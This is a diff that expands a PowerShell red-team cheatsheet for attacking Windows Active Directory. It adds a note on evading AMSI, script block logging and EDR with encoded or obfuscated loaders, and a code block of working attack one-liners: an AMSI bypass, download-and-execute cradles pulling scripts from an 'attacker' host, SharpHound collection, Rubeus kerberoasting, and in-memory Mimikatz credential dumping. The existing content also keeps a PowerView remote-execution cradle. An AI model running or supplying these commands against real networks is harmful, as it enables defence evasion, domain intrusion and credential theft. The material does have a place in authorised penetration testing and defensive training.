@@ -1,4 +1,8 @@
-# Domain Recon
+# PowerShell Red Team Cheatsheet
+
+**2026 Note**: AMSI, Script Block Logging, and modern EDR make direct downloads risky. Use encoded commands, in-memory only, or drop to C# / other. Many teams use pre-staged or obfuscated loaders. PowerView / SharpView equivalents and BloodHound still core for AD.
+
+## Domain Recon
 ## ShareFinder - Look for shares on network and check access under current user context & Log to file
 powershell.exe -exec Bypass -C "IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellEmpire/PowerTools/master/PowerView/powerview.ps1');Invoke-ShareFinder -CheckShareAccess|Out-File -FilePath sharefinder.txt"
 
@@ -90,3 +94,22 @@ https://download.sysinternals.com/files/SysinternalsSuite.zip
 
 ## List of Binaries that can be used for living off the land techniques
 https://github.com/api0cradle/LOLBAS
+
+## More Red Team PowerShell Examples (2026)
+
+```powershell
+# AMSI bypass (common patterns - test in lab)
+[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
+
+# Download cradle with proxy awareness
+$wc = New-Object System.Net.WebClient; $wc.Proxy = [System.Net.WebRequest]::DefaultWebProxy; IEX $wc.DownloadString('http://attacker/pv.ps1')
+
+# BloodHound + SharpHound modern
+IEX (iwr http://attacker/SharpHound.ps1 -UseBasicParsing); Invoke-BloodHound -CollectionMethod All
+
+# Kerberoasting (Rubeus)
+.\Rubeus.exe kerberoast /outfile:hashes.txt /domain:corp.local
+
+# In-memory Mimikatz alternative (safety)
+IEX (New-Object Net.WebClient).DownloadString('http://attacker/Invoke-Mimikatz.ps1'); Invoke-Mimikatz -DumpCreds
+```
